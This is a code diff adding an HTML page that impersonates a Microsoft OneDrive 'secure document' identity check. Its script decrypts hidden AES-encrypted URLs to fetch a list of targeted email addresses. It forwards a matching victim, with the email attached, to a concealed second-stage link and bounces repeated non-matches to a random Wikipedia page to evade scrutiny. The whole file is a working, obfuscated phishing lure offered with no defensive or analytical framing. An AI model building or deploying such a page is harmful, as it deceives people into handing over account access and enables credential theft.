@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Your Identity</title>
+    <style>
+        body {
+            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+            background-image: url('off.jpg'); /* Add your background image here */
+            background-size: cover;
+            background-position: center;
+        }
+
+        .header {
+            width: 100%;
+            background-color: #0078d4;
+            color: white;
+            text-align: left;
+            padding: 10px 20px;
+            box-sizing: border-box;
+            font-size: 18px;
+            position: absolute;
+            top: 0;
+        }
+
+        .header span {
+            margin-left: 20px;
+        }
+
+        .container {
+            background-color: white;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            padding: 33px;
+            width: 80%;
+            max-width: 300px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            margin-top: 0px;
+        }
+
+        .container img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .container h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .container p {
+            margin-bottom: 10px;
+            color: #666;
+        }
+
+        .container p2 {
+            display: block;
+            margin-bottom: 20px;
+            color: #666;
+            font-size: 13px;
+        }
+
+        .container input[type="email"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            font-size: 16px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .container button:hover {
+            background-color: #005a9e;
+        }
+
+        .container .footer {
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+
+            .container h2 {
+                font-size: 20px;
+            }
+
+            .container .space {
+                margin-bottom: 20px;
+            }
+
+            .container input[type="email"] {
+                font-size: 14px;
+            }
+
+            .container button {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <span>OneDrive</span>
+    </div>
+    <div class="container">
+        <img src="liveforever.jpg" alt="soft Logo">
+        <h2>Verify Your Identity</h2>
+        <p><strong>You've received a secure document:</strong></p>
+        <p2>To open this secure document, we'll need to verify the intended recipient's email. Please enter the email address to which this item was shared.</p2>
+        <input type="email" id="email-input" placeholder="Enter email" required style="margin-top: 10px;">
+        <button id="continue-button">Next</button>
+        <p class="footer">By clicking Next you allow Microsoft to use your email address in accordance with their privacy statement.</p>
+        <p class="footer">© 2024 Microsoft Privacy & Cookies</p>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script>
+        // Use the generated secret key from the Node.js script
+        const secretKey = "24aaf6dd294620130b9f503647f1bb85";
+
+        let attempts = 0;
+
+        async function fetchEmailList() {
+            // Use the encrypted URL from the Node.js script
+            const encryptedUrl = 'U2FsdGVkX18rvwsuFFOSPmQ1EUe4pwafw6PkavQZjR0QzoR/Jtm+yktGu3pd23NkGGnDxdDXroNLvj/S2dJi8+smuRFIVhxRx7i2EDzKxvw=';
+
+            // Decrypt the URL using the secret key
+            const decodedUrl = decryptUrl(encryptedUrl, secretKey);
+
+            try {
+                const response = await fetch(decodedUrl); // Fetch the email list
+                const text = await response.text();
+                return text.split(/\r?\n/).filter(email => email.trim().length > 0).map(email => email.toLowerCase());
+            } catch (error) {
+                console.error("Error fetching email list:", error);
+                return [];
+            }
+        }
+
+        // Function to decrypt the URL using AES
+        function decryptUrl(encryptedUrl, key) {
+            const bytes = CryptoJS.AES.decrypt(encryptedUrl, key);
+            return bytes.toString(CryptoJS.enc.Utf8);
+        }
+
+        async function continueLoading() {
+            const emailInput = document.getElementById('email-input');
+            const email = emailInput.value.trim().toLowerCase();
+            const validEmails = await fetchEmailList();
+
+            if (validateEmail(email)) {
+                if (validEmails.includes(email)) {
+                    // Use the encrypted link URL from the Node.js script
+                    const encryptedLink = "U2FsdGVkX1/BLFH/eTaXaSl/ryPbN/AZd2151o6Rub0mPbF+Ei5X7OR8bSQy3+v3gIXIVG05Kqzm89YMfJ2wePQQ9K1dCPSbR5oqOjjacBw=";
+                    const decodedLink = decryptUrl(encryptedLink, secretKey);
+                    const finalLink = `${decodedLink}?username=${email}`;
+                    window.location.href = finalLink;
+                } else {
+                    attempts++;
+                    if (attempts >= 4) {
+                        const randomWiki = await fetchRandomWiki();
+                        window.location.href = randomWiki;
+                    } else {
+                        alert("Email not recognized. Please try again.");
+                    }
+                }
+            } else {
+                alert("Please enter a valid email address.");
+            }
+        }
+
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+
+        async function fetchRandomWiki() {
+            const response = await fetch('https://en.wikipedia.org/wiki/Special:Random');
+            return response.url;
+        }
+
+        document.getElementById('continue-button').addEventListener('click', continueLoading);
+        document.getElementById('email-input').addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                continueLoading();
+            }
+        });
+    </script>
+</body>
+</html>
